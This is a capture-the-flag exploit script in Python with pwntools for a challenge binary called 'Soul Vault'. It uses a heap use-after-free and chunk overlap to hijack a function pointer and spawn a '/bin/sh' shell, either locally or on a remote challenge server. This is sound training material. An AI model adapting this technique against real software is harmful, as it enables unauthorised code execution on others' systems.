#!/usr/bin/env python3
"""
Soul Vault: The Collector - Use-After-Free Exploit
Author: Suyog Jadhav
Category: Binary Exploitation / Pwn (Hard)
Target: glibc heap UAF & function pointer hijacking
"""

import os
import sys
from pwn import *

context.arch = 'amd64'

HOST = "145.239.142.129"
PORT = 1338

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        bin_path = "./soul-vault-collector/challenge/soul_vault"
        if not os.path.exists(bin_path):
            bin_path = "./soul_vault"
        return process(bin_path)

def capture(io, name, size, memory):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendafter(b"Enter Soul Name: ", name)
    io.sendlineafter(b"Enter Memory Size (max 1024): ", str(size).encode())
    io.sendafter(b"Inscribe Memory: ", memory)

def inspect(io, idx):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"Enter vessel index (0-7): ", str(idx).encode())

def release(io, idx):
    io.sendlineafter(b"Choice: ", b"3")
    io.sendlineafter(b"Enter vessel index (0-7): ", str(idx).encode())

def rename(io, idx, new_name):
    io.sendlineafter(b"Choice: ", b"4")
    io.sendlineafter(b"Enter vessel index (0-7): ", str(idx).encode())
    io.sendafter(b"Enter new name: ", new_name)

def exploit():
    io = get_process()

    log.info("Step 1: Capturing 3 initial souls...")
    capture(io, b"/bin/sh\x00", 64, b"Memory_Vessel_0\n")
    capture(io, b"Vessel1\n", 64, b"Memory_Vessel_1\n")
    capture(io, b"Vessel2\n", 64, b"Memory_Vessel_2\n")

    log.info("Step 2: Releasing 3 souls to satisfy sacrifice_count == 3...")
    release(io, 0)
    release(io, 1)
    release(io, 2)

    log.info("Step 3: Heap reallocation & Chunk Overlapping...")
    payload = b"/bin/sh\x00" + b"\x00" * 24
    payload += p64(0)
    capture(io, b"MasterSoul\n", 56, payload + b"\n")

    log.info("Step 4: Triggering hijacked function pointer on dangling soul...")
    inspect(io, 0)

    log.success("Ritual fulfilled! Shell spawned.")
    io.interactive()

if __name__ == "__main__":
    exploit()
